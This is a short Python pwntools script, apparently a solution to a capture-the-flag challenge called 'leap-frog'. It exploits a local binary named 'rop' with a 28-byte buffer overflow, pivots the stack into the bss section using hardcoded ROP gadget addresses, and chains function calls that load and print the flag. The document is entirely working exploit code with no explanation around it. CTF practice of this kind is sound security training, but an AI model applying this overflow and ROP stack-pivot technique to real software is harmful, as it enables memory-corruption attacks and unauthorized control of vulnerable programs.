from pwn import *

# Here be Gadgets
pop_ebp = p32(0x080485fb)
bss = 0x0804a03c
new_stack = p32(bss + 0x900)
display_flag = p32(0x80486b3)
get_input = p32(0x80487b8)
flag = p32(0x804a8f4)
puts = p32(0x80486f1)
move_stack = p32(0x08048406) # add esp, 8; pop ebx; ret;

io = process('./rop', cwd='/problems/leap-frog_6_772f62cb51a325a368a9d1563bf4058a')

io.recvuntil('input>')

# Stage 1 stack pivot
payload = 'A'*28
payload += pop_ebp
payload += new_stack
payload += get_input
io.sendline(payload)

# Stage 2 Load flag and disply from fake stack
payload = 'A'*28
payload += display_flag
payload += (move_stack + 'A'*12)*20
payload += puts
payload += flag
io.sendline(payload)
print io.recvall()
